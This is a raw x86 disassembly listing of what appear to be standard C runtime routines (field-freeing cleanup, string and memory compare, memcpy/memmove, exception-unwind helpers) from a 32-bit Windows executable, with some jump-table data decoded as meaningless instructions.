  4262cd:	push   DWORD PTR [esi+0xc]
  4262d0:	call   0x42455a
  4262d5:	push   DWORD PTR [esi+0x10]
  4262d8:	call   0x42455a
  4262dd:	push   DWORD PTR [esi+0x14]
  4262e0:	call   0x42455a
  4262e5:	push   DWORD PTR [esi+0x18]
  4262e8:	call   0x42455a
  4262ed:	push   DWORD PTR [esi]
  4262ef:	call   0x42455a
  4262f4:	push   DWORD PTR [esi+0x20]
  4262f7:	call   0x42455a
  4262fc:	push   DWORD PTR [esi+0x24]
  4262ff:	call   0x42455a
  426304:	push   DWORD PTR [esi+0x28]
  426307:	call   0x42455a
  42630c:	push   DWORD PTR [esi+0x2c]
  42630f:	call   0x42455a
  426314:	push   DWORD PTR [esi+0x30]
  426317:	call   0x42455a
  42631c:	push   DWORD PTR [esi+0x34]
  42631f:	call   0x42455a
  426324:	push   DWORD PTR [esi+0x1c]
  426327:	call   0x42455a
  42632c:	push   DWORD PTR [esi+0x38]
  42632f:	call   0x42455a
  426334:	push   DWORD PTR [esi+0x3c]
  426337:	call   0x42455a
  42633c:	add    esp,0x40
  42633f:	push   DWORD PTR [esi+0x40]
  426342:	call   0x42455a
  426347:	push   DWORD PTR [esi+0x44]
  42634a:	call   0x42455a
  42634f:	push   DWORD PTR [esi+0x48]
  426352:	call   0x42455a
  426357:	push   DWORD PTR [esi+0x4c]
  42635a:	call   0x42455a
  42635f:	push   DWORD PTR [esi+0x50]
  426362:	call   0x42455a
  426367:	push   DWORD PTR [esi+0x54]
  42636a:	call   0x42455a
  42636f:	push   DWORD PTR [esi+0x58]
  426372:	call   0x42455a
  426377:	push   DWORD PTR [esi+0x5c]
  42637a:	call   0x42455a
  42637f:	push   DWORD PTR [esi+0x60]
  426382:	call   0x42455a
  426387:	push   DWORD PTR [esi+0x64]
  42638a:	call   0x42455a
  42638f:	push   DWORD PTR [esi+0x68]
  426392:	call   0x42455a
  426397:	push   DWORD PTR [esi+0x6c]
  42639a:	call   0x42455a
  42639f:	push   DWORD PTR [esi+0x70]
  4263a2:	call   0x42455a
  4263a7:	push   DWORD PTR [esi+0x74]
  4263aa:	call   0x42455a
  4263af:	push   DWORD PTR [esi+0x78]
  4263b2:	call   0x42455a
  4263b7:	push   DWORD PTR [esi+0x7c]
  4263ba:	call   0x42455a
  4263bf:	add    esp,0x40
  4263c2:	push   DWORD PTR [esi+0x80]
  4263c8:	call   0x42455a
  4263cd:	push   DWORD PTR [esi+0x84]
  4263d3:	call   0x42455a
  4263d8:	push   DWORD PTR [esi+0x88]
  4263de:	call   0x42455a
  4263e3:	push   DWORD PTR [esi+0x8c]
  4263e9:	call   0x42455a
  4263ee:	push   DWORD PTR [esi+0x90]
  4263f4:	call   0x42455a
  4263f9:	push   DWORD PTR [esi+0x94]
  4263ff:	call   0x42455a
  426404:	push   DWORD PTR [esi+0x98]
  42640a:	call   0x42455a
  42640f:	push   DWORD PTR [esi+0x9c]
  426415:	call   0x42455a
  42641a:	push   DWORD PTR [esi+0xa0]
  426420:	call   0x42455a
  426425:	push   DWORD PTR [esi+0xa4]
  42642b:	call   0x42455a
  426430:	push   DWORD PTR [esi+0xa8]
  426436:	call   0x42455a
  42643b:	add    esp,0x2c
  42643e:	pop    esi
  42643f:	ret    
  426440:	push   esi
  426441:	mov    esi,DWORD PTR [esp+0x8]
  426445:	test   esi,esi
  426447:	je     0x42649d
  426449:	mov    eax,DWORD PTR [esi]
  42644b:	mov    ecx,DWORD PTR ds:0x464bc4
  426451:	cmp    eax,DWORD PTR [ecx]
  426453:	je     0x426464
  426455:	cmp    eax,DWORD PTR ds:0x464b94
  42645b:	je     0x426464
  42645d:	push   eax
  42645e:	call   0x42455a
  426463:	pop    ecx
  426464:	mov    eax,DWORD PTR [esi+0x4]
  426467:	mov    ecx,DWORD PTR ds:0x464bc4
  42646d:	cmp    eax,DWORD PTR [ecx+0x4]
  426470:	je     0x426481
  426472:	cmp    eax,DWORD PTR ds:0x464b98
  426478:	je     0x426481
  42647a:	push   eax
  42647b:	call   0x42455a
  426480:	pop    ecx
  426481:	mov    esi,DWORD PTR [esi+0x8]
  426484:	mov    eax,ds:0x464bc4
  426489:	cmp    esi,DWORD PTR [eax+0x8]
  42648c:	je     0x42649d
  42648e:	cmp    esi,DWORD PTR ds:0x464b9c
  426494:	je     0x42649d
  426496:	push   esi
  426497:	call   0x42455a
  42649c:	pop    ecx
  42649d:	pop    esi
  42649e:	ret    
  42649f:	push   esi
  4264a0:	mov    esi,DWORD PTR [esp+0x8]
  4264a4:	test   esi,esi
  4264a6:	je     0x426576
  4264ac:	mov    eax,DWORD PTR [esi+0xc]
  4264af:	mov    ecx,DWORD PTR ds:0x464bc4
  4264b5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264b8:	je     0x4264c9
  4264ba:	cmp    eax,DWORD PTR ds:0x464ba0
  4264c0:	je     0x4264c9
  4264c2:	push   eax
  4264c3:	call   0x42455a
  4264c8:	pop    ecx
  4264c9:	mov    eax,DWORD PTR [esi+0x10]
  4264cc:	mov    ecx,DWORD PTR ds:0x464bc4
  4264d2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264d5:	je     0x4264e6
  4264d7:	cmp    eax,DWORD PTR ds:0x464ba4
  4264dd:	je     0x4264e6
  4264df:	push   eax
  4264e0:	call   0x42455a
  4264e5:	pop    ecx
  4264e6:	mov    eax,DWORD PTR [esi+0x14]
  4264e9:	mov    ecx,DWORD PTR ds:0x464bc4
  4264ef:	cmp    eax,DWORD PTR [ecx+0x14]
  4264f2:	je     0x426503
  4264f4:	cmp    eax,DWORD PTR ds:0x464ba8
  4264fa:	je     0x426503
  4264fc:	push   eax
  4264fd:	call   0x42455a
  426502:	pop    ecx
  426503:	mov    eax,DWORD PTR [esi+0x18]
  426506:	mov    ecx,DWORD PTR ds:0x464bc4
  42650c:	cmp    eax,DWORD PTR [ecx+0x18]
  42650f:	je     0x426520
  426511:	cmp    eax,DWORD PTR ds:0x464bac
  426517:	je     0x426520
  426519:	push   eax
  42651a:	call   0x42455a
  42651f:	pop    ecx
  426520:	mov    eax,DWORD PTR [esi+0x1c]
  426523:	mov    ecx,DWORD PTR ds:0x464bc4
  426529:	cmp    eax,DWORD PTR [ecx+0x1c]
  42652c:	je     0x42653d
  42652e:	cmp    eax,DWORD PTR ds:0x464bb0
  426534:	je     0x42653d
  426536:	push   eax
  426537:	call   0x42455a
  42653c:	pop    ecx
  42653d:	mov    eax,DWORD PTR [esi+0x20]
  426540:	mov    ecx,DWORD PTR ds:0x464bc4
  426546:	cmp    eax,DWORD PTR [ecx+0x20]
  426549:	je     0x42655a
  42654b:	cmp    eax,DWORD PTR ds:0x464bb4
  426551:	je     0x42655a
  426553:	push   eax
  426554:	call   0x42455a
  426559:	pop    ecx
  42655a:	mov    esi,DWORD PTR [esi+0x24]
  42655d:	mov    eax,ds:0x464bc4
  426562:	cmp    esi,DWORD PTR [eax+0x24]
  426565:	je     0x426576
  426567:	cmp    esi,DWORD PTR ds:0x464bb8
  42656d:	je     0x426576
  42656f:	push   esi
  426570:	call   0x42455a
  426575:	pop    ecx
  426576:	pop    esi
  426577:	ret    
  426578:	int3   
  426579:	int3   
  42657a:	int3   
  42657b:	int3   
  42657c:	int3   
  42657d:	int3   
  42657e:	int3   
  42657f:	int3   
  426580:	push   ebp
  426581:	mov    ebp,esp
  426583:	push   esi
  426584:	xor    eax,eax
  426586:	push   eax
  426587:	push   eax
  426588:	push   eax
  426589:	push   eax
  42658a:	push   eax
  42658b:	push   eax
  42658c:	push   eax
  42658d:	push   eax
  42658e:	mov    edx,DWORD PTR [ebp+0xc]
  426591:	lea    ecx,[ecx+0x0]
  426594:	mov    al,BYTE PTR [edx]
  426596:	or     al,al
  426598:	je     0x4265a3
  42659a:	add    edx,0x1
  42659d:	bts    DWORD PTR [esp],eax
  4265a1:	jmp    0x426594
  4265a3:	mov    esi,DWORD PTR [ebp+0x8]
  4265a6:	or     ecx,0xffffffff
  4265a9:	lea    ecx,[ecx+0x0]
  4265ac:	add    ecx,0x1
  4265af:	mov    al,BYTE PTR [esi]
  4265b1:	or     al,al
  4265b3:	je     0x4265be
  4265b5:	add    esi,0x1
  4265b8:	bt     DWORD PTR [esp],eax
  4265bc:	jae    0x4265ac
  4265be:	mov    eax,ecx
  4265c0:	add    esp,0x20
  4265c3:	pop    esi
  4265c4:	leave  
  4265c5:	ret    
  4265c6:	int3   
  4265c7:	int3   
  4265c8:	int3   
  4265c9:	int3   
  4265ca:	int3   
  4265cb:	int3   
  4265cc:	int3   
  4265cd:	int3   
  4265ce:	int3   
  4265cf:	int3   
  4265d0:	mov    edx,DWORD PTR [esp+0x4]
  4265d4:	mov    ecx,DWORD PTR [esp+0x8]
  4265d8:	test   edx,0x3
  4265de:	jne    0x42661c
  4265e0:	mov    eax,DWORD PTR [edx]
  4265e2:	cmp    al,BYTE PTR [ecx]
  4265e4:	jne    0x426614
  4265e6:	or     al,al
  4265e8:	je     0x426610
  4265ea:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ed:	jne    0x426614
  4265ef:	or     ah,ah
  4265f1:	je     0x426610
  4265f3:	shr    eax,0x10
  4265f6:	cmp    al,BYTE PTR [ecx+0x2]
  4265f9:	jne    0x426614
  4265fb:	or     al,al
  4265fd:	je     0x426610
  4265ff:	cmp    ah,BYTE PTR [ecx+0x3]
  426602:	jne    0x426614
  426604:	add    ecx,0x4
  426607:	add    edx,0x4
  42660a:	or     ah,ah
  42660c:	jne    0x4265e0
  42660e:	mov    edi,edi
  426610:	xor    eax,eax
  426612:	ret    
  426613:	nop
  426614:	sbb    eax,eax
  426616:	shl    eax,1
  426618:	add    eax,0x1
  42661b:	ret    
  42661c:	test   edx,0x1
  426622:	je     0x42663c
  426624:	mov    al,BYTE PTR [edx]
  426626:	add    edx,0x1
  426629:	cmp    al,BYTE PTR [ecx]
  42662b:	jne    0x426614
  42662d:	add    ecx,0x1
  426630:	or     al,al
  426632:	je     0x426610
  426634:	test   edx,0x2
  42663a:	je     0x4265e0
  42663c:	mov    ax,WORD PTR [edx]
  42663f:	add    edx,0x2
  426642:	cmp    al,BYTE PTR [ecx]
  426644:	jne    0x426614
  426646:	or     al,al
  426648:	je     0x426610
  42664a:	cmp    ah,BYTE PTR [ecx+0x1]
  42664d:	jne    0x426614
  42664f:	or     ah,ah
  426651:	je     0x426610
  426653:	add    ecx,0x2
  426656:	jmp    0x4265e0
  426658:	int3   
  426659:	int3   
  42665a:	int3   
  42665b:	int3   
  42665c:	int3   
  42665d:	int3   
  42665e:	int3   
  42665f:	int3   
  426660:	mov    eax,DWORD PTR [esp+0xc]
  426664:	test   eax,eax
  426666:	je     0x4266b2
  426668:	mov    edx,DWORD PTR [esp+0x4]
  42666c:	push   esi
  42666d:	push   edi
  42666e:	mov    esi,edx
  426670:	mov    edi,DWORD PTR [esp+0x10]
  426674:	or     edx,edi
  426676:	and    edx,0x3
  426679:	je     0x4266b3
  42667b:	test   eax,0x1
  426680:	je     0x426693
  426682:	mov    cl,BYTE PTR [esi]
  426684:	cmp    cl,BYTE PTR [edi]
  426686:	jne    0x4266e0
  426688:	add    esi,0x1
  42668b:	add    edi,0x1
  42668e:	sub    eax,0x1
  426691:	je     0x4266b0
  426693:	mov    cl,BYTE PTR [esi]
  426695:	mov    dl,BYTE PTR [edi]
  426697:	cmp    cl,dl
  426699:	jne    0x4266e0
  42669b:	mov    cl,BYTE PTR [esi+0x1]
  42669e:	mov    dl,BYTE PTR [edi+0x1]
  4266a1:	cmp    cl,dl
  4266a3:	jne    0x4266e0
  4266a5:	add    edi,0x2
  4266a8:	add    esi,0x2
  4266ab:	sub    eax,0x2
  4266ae:	jne    0x426693
  4266b0:	pop    edi
  4266b1:	pop    esi
  4266b2:	ret    
  4266b3:	mov    ecx,eax
  4266b5:	and    eax,0x3
  4266b8:	shr    ecx,0x2
  4266bb:	je     0x4266e8
  4266bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bf:	je     0x4266e8
  4266c1:	mov    ecx,DWORD PTR [esi-0x4]
  4266c4:	mov    edx,DWORD PTR [edi-0x4]
  4266c7:	cmp    cl,dl
  4266c9:	jne    0x4266db
  4266cb:	cmp    ch,dh
  4266cd:	jne    0x4266db
  4266cf:	shr    ecx,0x10
  4266d2:	shr    edx,0x10
  4266d5:	cmp    cl,dl
  4266d7:	jne    0x4266db
  4266d9:	cmp    ch,dh
  4266db:	mov    eax,0x0
  4266e0:	sbb    eax,eax
  4266e2:	pop    edi
  4266e3:	sbb    eax,0xffffffff
  4266e6:	pop    esi
  4266e7:	ret    
  4266e8:	test   eax,eax
  4266ea:	je     0x4266b0
  4266ec:	mov    edx,DWORD PTR [esi]
  4266ee:	mov    ecx,DWORD PTR [edi]
  4266f0:	cmp    dl,cl
  4266f2:	jne    0x4266db
  4266f4:	sub    eax,0x1
  4266f7:	je     0x426715
  4266f9:	cmp    dh,ch
  4266fb:	jne    0x4266db
  4266fd:	sub    eax,0x1
  426700:	je     0x426715
  426702:	and    ecx,0xff0000
  426708:	and    edx,0xff0000
  42670e:	cmp    edx,ecx
  426710:	jne    0x4266db
  426712:	sub    eax,0x1
  426715:	pop    edi
  426716:	pop    esi
  426717:	ret    
  426718:	int3   
  426719:	int3   
  42671a:	int3   
  42671b:	int3   
  42671c:	int3   
  42671d:	int3   
  42671e:	int3   
  42671f:	int3   
  426720:	push   ebp
  426721:	mov    ebp,esp
  426723:	push   edi
  426724:	push   esi
  426725:	push   ebx
  426726:	mov    ecx,DWORD PTR [ebp+0x10]
  426729:	jecxz  0x426752
  42672b:	mov    ebx,ecx
  42672d:	mov    edi,DWORD PTR [ebp+0x8]
  426730:	mov    esi,edi
  426732:	xor    eax,eax
  426734:	repnz scas al,BYTE PTR es:[edi]
  426736:	neg    ecx
  426738:	add    ecx,ebx
  42673a:	mov    edi,esi
  42673c:	mov    esi,DWORD PTR [ebp+0xc]
  42673f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426741:	mov    al,BYTE PTR [esi-0x1]
  426744:	xor    ecx,ecx
  426746:	cmp    al,BYTE PTR [edi-0x1]
  426749:	ja     0x426750
  42674b:	je     0x426752
  42674d:	sub    ecx,0x2
  426750:	not    ecx
  426752:	mov    eax,ecx
  426754:	pop    ebx
  426755:	pop    esi
  426756:	pop    edi
  426757:	leave  
  426758:	ret    
  426759:	int3   
  42675a:	int3   
  42675b:	int3   
  42675c:	int3   
  42675d:	int3   
  42675e:	int3   
  42675f:	int3   
  426760:	push   ebp
  426761:	mov    ebp,esp
  426763:	push   esi
  426764:	xor    eax,eax
  426766:	push   eax
  426767:	push   eax
  426768:	push   eax
  426769:	push   eax
  42676a:	push   eax
  42676b:	push   eax
  42676c:	push   eax
  42676d:	push   eax
  42676e:	mov    edx,DWORD PTR [ebp+0xc]
  426771:	lea    ecx,[ecx+0x0]
  426774:	mov    al,BYTE PTR [edx]
  426776:	or     al,al
  426778:	je     0x426783
  42677a:	add    edx,0x1
  42677d:	bts    DWORD PTR [esp],eax
  426781:	jmp    0x426774
  426783:	mov    esi,DWORD PTR [ebp+0x8]
  426786:	mov    edi,edi
  426788:	mov    al,BYTE PTR [esi]
  42678a:	or     al,al
  42678c:	je     0x42679a
  42678e:	add    esi,0x1
  426791:	bt     DWORD PTR [esp],eax
  426795:	jae    0x426788
  426797:	lea    eax,[esi-0x1]
  42679a:	add    esp,0x20
  42679d:	pop    esi
  42679e:	leave  
  42679f:	ret    
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   ebx
  4267a4:	push   esi
  4267a5:	push   edi
  4267a6:	push   ebp
  4267a7:	push   0x0
  4267a9:	push   0x0
  4267ab:	push   0x4267b8
  4267b0:	push   DWORD PTR [ebp+0x8]
  4267b3:	call   0x42722e
  4267b8:	pop    ebp
  4267b9:	pop    edi
  4267ba:	pop    esi
  4267bb:	pop    ebx
  4267bc:	mov    esp,ebp
  4267be:	pop    ebp
  4267bf:	ret    
  4267c0:	mov    ecx,DWORD PTR [esp+0x4]
  4267c4:	test   DWORD PTR [ecx+0x4],0x6
  4267cb:	mov    eax,0x1
  4267d0:	je     0x4267e1
  4267d2:	mov    eax,DWORD PTR [esp+0x8]
  4267d6:	mov    edx,DWORD PTR [esp+0x10]
  4267da:	mov    DWORD PTR [edx],eax
  4267dc:	mov    eax,0x3
  4267e1:	ret    
  4267e2:	push   ebx
  4267e3:	push   esi
  4267e4:	push   edi
  4267e5:	mov    eax,DWORD PTR [esp+0x10]
  4267e9:	push   eax
  4267ea:	push   0xfffffffe
  4267ec:	push   0x4267c0
  4267f1:	push   DWORD PTR fs:0x0
  4267f8:	mov    DWORD PTR fs:0x0,esp
  4267ff:	mov    eax,DWORD PTR [esp+0x20]
  426803:	mov    ebx,DWORD PTR [eax+0x8]
  426806:	mov    esi,DWORD PTR [eax+0xc]
  426809:	cmp    esi,0xffffffff
  42680c:	je     0x42683c
  42680e:	cmp    esi,DWORD PTR [esp+0x24]
  426812:	je     0x42683c
  426814:	lea    esi,[esi+esi*2]
  426817:	mov    ecx,DWORD PTR [ebx+esi*4]
  42681a:	mov    DWORD PTR [esp+0x8],ecx
  42681e:	mov    DWORD PTR [eax+0xc],ecx
  426821:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426826:	jne    0x42683a
  426828:	push   0x101
  42682d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426831:	call   0x426876
  426836:	call   DWORD PTR [ebx+esi*4+0x8]
  42683a:	jmp    0x4267ff
  42683c:	pop    DWORD PTR fs:0x0
  426843:	add    esp,0xc
  426846:	pop    edi
  426847:	pop    esi
  426848:	pop    ebx
  426849:	ret    
  42684a:	xor    eax,eax
  42684c:	mov    ecx,DWORD PTR fs:0x0
  426853:	cmp    DWORD PTR [ecx+0x4],0x4267c0
  42685a:	jne    0x42686c
  42685c:	mov    edx,DWORD PTR [ecx+0xc]
  42685f:	mov    edx,DWORD PTR [edx+0xc]
  426862:	cmp    DWORD PTR [ecx+0x8],edx
  426865:	jne    0x42686c
  426867:	mov    eax,0x1
  42686c:	ret    
  42686d:	push   ebx
  42686e:	push   ecx
  42686f:	mov    ebx,0x464bdc
  426874:	jmp    0x426880
  426876:	push   ebx
  426877:	push   ecx
  426878:	mov    ebx,0x464bdc
  42687d:	mov    ecx,DWORD PTR [ebp+0x8]
  426880:	mov    DWORD PTR [ebx+0x8],ecx
  426883:	mov    DWORD PTR [ebx+0x4],eax
  426886:	mov    DWORD PTR [ebx+0xc],ebp
  426889:	pop    ecx
  42688a:	pop    ebx
  42688b:	ret    0x4
  42688e:	int3   
  42688f:	int3   
  426890:	push   ebp
  426891:	mov    ebp,esp
  426893:	push   edi
  426894:	push   esi
  426895:	mov    esi,DWORD PTR [ebp+0xc]
  426898:	mov    ecx,DWORD PTR [ebp+0x10]
  42689b:	mov    edi,DWORD PTR [ebp+0x8]
  42689e:	mov    eax,ecx
  4268a0:	mov    edx,ecx
  4268a2:	add    eax,esi
  4268a4:	cmp    edi,esi
  4268a6:	jbe    0x4268b0
  4268a8:	cmp    edi,eax
  4268aa:	jb     0x426a2c
  4268b0:	test   edi,0x3
  4268b6:	jne    0x4268cc
  4268b8:	shr    ecx,0x2
  4268bb:	and    edx,0x3
  4268be:	cmp    ecx,0x8
  4268c1:	jb     0x4268ec
  4268c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c5:	jmp    DWORD PTR [edx*4+0x4269dc]
  4268cc:	mov    eax,edi
  4268ce:	mov    edx,0x3
  4268d3:	sub    ecx,0x4
  4268d6:	jb     0x4268e4
  4268d8:	and    eax,0x3
  4268db:	add    ecx,eax
  4268dd:	jmp    DWORD PTR [eax*4+0x4268f0]
  4268e4:	jmp    DWORD PTR [ecx*4+0x4269ec]
  4268eb:	nop
  4268ec:	jmp    DWORD PTR [ecx*4+0x426970]
  4268f3:	nop
  4268f4:	add    BYTE PTR [ecx+0x42],ch
  4268f7:	add    BYTE PTR [ecx+ebp*2],ch
  4268fa:	inc    edx
  4268fb:	add    BYTE PTR [eax+0x69],dl
  4268fe:	inc    edx
  4268ff:	add    BYTE PTR [ebx],ah
  426901:	ror    DWORD PTR [edx-0x75f877fa],1
  426907:	inc    esi
  426908:	add    DWORD PTR [eax+0x468a0147],ecx
  42690e:	add    al,cl
  426910:	jmp    0x289f117
  426915:	add    esi,0x3
  426918:	add    edi,0x3
  42691b:	cmp    ecx,0x8
  42691e:	jb     0x4268ec
  426920:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426922:	jmp    DWORD PTR [edx*4+0x4269dc]
  426929:	lea    ecx,[ecx+0x0]
  42692c:	and    edx,ecx
  42692e:	mov    al,BYTE PTR [esi]
  426930:	mov    BYTE PTR [edi],al
  426932:	mov    al,BYTE PTR [esi+0x1]
  426935:	shr    ecx,0x2
  426938:	mov    BYTE PTR [edi+0x1],al
  42693b:	add    esi,0x2
  42693e:	add    edi,0x2
  426941:	cmp    ecx,0x8
  426944:	jb     0x4268ec
  426946:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426948:	jmp    DWORD PTR [edx*4+0x4269dc]
  42694f:	nop
  426950:	and    edx,ecx
  426952:	mov    al,BYTE PTR [esi]
  426954:	mov    BYTE PTR [edi],al
  426956:	add    esi,0x1
  426959:	shr    ecx,0x2
  42695c:	add    edi,0x1
  42695f:	cmp    ecx,0x8
  426962:	jb     0x4268ec
  426964:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426966:	jmp    DWORD PTR [edx*4+0x4269dc]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	shr    DWORD PTR [ecx+0x42],cl
  426973:	add    al,al
  426975:	imul   eax,DWORD PTR [edx+0x0],0x4269b8
  42697c:	mov    al,0x69
  42697e:	inc    edx
  42697f:	add    BYTE PTR [eax-0x5fffbd97],ch
  426985:	imul   eax,DWORD PTR [edx+0x0],0x426998
  42698c:	nop
  42698d:	imul   eax,DWORD PTR [edx+0x0],0xe48e448b
  426994:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269c8:	lea    eax,[ecx*4+0x0]
  4269cf:	add    esi,eax
  4269d1:	add    edi,eax
  4269d3:	jmp    DWORD PTR [edx*4+0x4269dc]
  4269da:	mov    edi,edi
  4269dc:	in     al,dx
  4269dd:	imul   eax,DWORD PTR [edx+0x0],0x4269f4
  4269e4:	add    BYTE PTR [edx+0x42],ch
  4269e7:	add    BYTE PTR [edx+ebp*2],dl
  4269ea:	inc    edx
  4269eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269f1:	leave  
  4269f2:	ret    
  4269f3:	nop
  4269f4:	mov    al,BYTE PTR [esi]
  4269f6:	mov    BYTE PTR [edi],al
  4269f8:	mov    eax,DWORD PTR [ebp+0x8]
  4269fb:	pop    esi
  4269fc:	pop    edi
  4269fd:	leave  
  4269fe:	ret    
  4269ff:	nop
  426a00:	mov    al,BYTE PTR [esi]
  426a02:	mov    BYTE PTR [edi],al
  426a04:	mov    al,BYTE PTR [esi+0x1]
  426a07:	mov    BYTE PTR [edi+0x1],al
  426a0a:	mov    eax,DWORD PTR [ebp+0x8]
  426a0d:	pop    esi
  426a0e:	pop    edi
  426a0f:	leave  
  426a10:	ret    
  426a11:	lea    ecx,[ecx+0x0]
  426a14:	mov    al,BYTE PTR [esi]
  426a16:	mov    BYTE PTR [edi],al
  426a18:	mov    al,BYTE PTR [esi+0x1]
  426a1b:	mov    BYTE PTR [edi+0x1],al
  426a1e:	mov    al,BYTE PTR [esi+0x2]
  426a21:	mov    BYTE PTR [edi+0x2],al
  426a24:	mov    eax,DWORD PTR [ebp+0x8]
  426a27:	pop    esi
  426a28:	pop    edi
  426a29:	leave  
  426a2a:	ret    
  426a2b:	nop
  426a2c:	lea    esi,[ecx+esi*1-0x4]
  426a30:	lea    edi,[ecx+edi*1-0x4]
  426a34:	test   edi,0x3
  426a3a:	jne    0x426a60
  426a3c:	shr    ecx,0x2
  426a3f:	and    edx,0x3
  426a42:	cmp    ecx,0x8
  426a45:	jb     0x426a54
  426a47:	std    
  426a48:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a4a:	cld    
  426a4b:	jmp    DWORD PTR [edx*4+0x426b78]
  426a52:	mov    edi,edi
  426a54:	neg    ecx
  426a56:	jmp    DWORD PTR [ecx*4+0x426b28]
  426a5d:	lea    ecx,[ecx+0x0]
  426a60:	mov    eax,edi
  426a62:	mov    edx,0x3
  426a67:	cmp    ecx,0x4
  426a6a:	jb     0x426a78
  426a6c:	and    eax,0x3
  426a6f:	sub    ecx,eax
  426a71:	jmp    DWORD PTR [eax*4+0x426a7c]
  426a78:	jmp    DWORD PTR [ecx*4+0x426b78]
  426a7f:	nop
  426a80:	mov    WORD PTR [edx+0x42],gs
  426a83:	add    BYTE PTR [eax-0x27ffbd96],dh
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a91:	mov    BYTE PTR [edi+0x3],al
  426a94:	sub    esi,0x1
  426a97:	shr    ecx,0x2
  426a9a:	sub    edi,0x1
  426a9d:	cmp    ecx,0x8
  426aa0:	jb     0x426a54
  426aa2:	std    
  426aa3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa5:	cld    
  426aa6:	jmp    DWORD PTR [edx*4+0x426b78]
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	and    edx,ecx
  426ab5:	mov    BYTE PTR [edi+0x3],al
  426ab8:	mov    al,BYTE PTR [esi+0x2]
  426abb:	shr    ecx,0x2
  426abe:	mov    BYTE PTR [edi+0x2],al
  426ac1:	sub    esi,0x2
  426ac4:	sub    edi,0x2
  426ac7:	cmp    ecx,0x8
  426aca:	jb     0x426a54
  426acc:	std    
  426acd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426acf:	cld    
  426ad0:	jmp    DWORD PTR [edx*4+0x426b78]
  426ad7:	nop
  426ad8:	mov    al,BYTE PTR [esi+0x3]
  426adb:	and    edx,ecx
  426add:	mov    BYTE PTR [edi+0x3],al
  426ae0:	mov    al,BYTE PTR [esi+0x2]
  426ae3:	mov    BYTE PTR [edi+0x2],al
  426ae6:	mov    al,BYTE PTR [esi+0x1]
  426ae9:	shr    ecx,0x2
  426aec:	mov    BYTE PTR [edi+0x1],al
  426aef:	sub    esi,0x3
  426af2:	sub    edi,0x3
  426af5:	cmp    ecx,0x8
  426af8:	jb     0x426a54
  426afe:	std    
  426aff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b01:	cld    
  426b02:	jmp    DWORD PTR [edx*4+0x426b78]
  426b09:	lea    ecx,[ecx+0x0]
  426b0c:	sub    al,0x6b
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2],dh
  426b12:	inc    edx
  426b13:	add    BYTE PTR [ebx+ebp*2],bh
  426b16:	inc    edx
  426b17:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b1b:	add    BYTE PTR [ebx+ebp*2+0x42],cl
  426b1f:	add    BYTE PTR [ebx+ebp*2+0x42],dl
  426b23:	add    BYTE PTR [ebx+ebp*2+0x42],bl
  426b27:	add    BYTE PTR [edi+0x6b],ch
  426b2a:	inc    edx
  426b2b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b31:	inc    esp
  426b32:	(bad)  
  426b33:	sbb    al,0x8b
  426b35:	inc    esp
  426b36:	mov    ds,WORD PTR [eax]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b40:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b50:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b54:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b58:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b5c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b60:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b64:	lea    eax,[ecx*4+0x0]
  426b6b:	add    esi,eax
  426b6d:	add    edi,eax
  426b6f:	jmp    DWORD PTR [edx*4+0x426b78]
  426b76:	mov    edi,edi
  426b78:	mov    BYTE PTR [ebx+0x42],ch
  426b7b:	add    BYTE PTR [eax-0x5fffbd95],dl
  426b81:	imul   eax,DWORD PTR [edx+0x0],0xffffffb4
  426b85:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b89:	inc    ebp
  426b8a:	or     BYTE PTR [esi+0x5f],bl
  426b8d:	leave  
  426b8e:	ret    
  426b8f:	nop
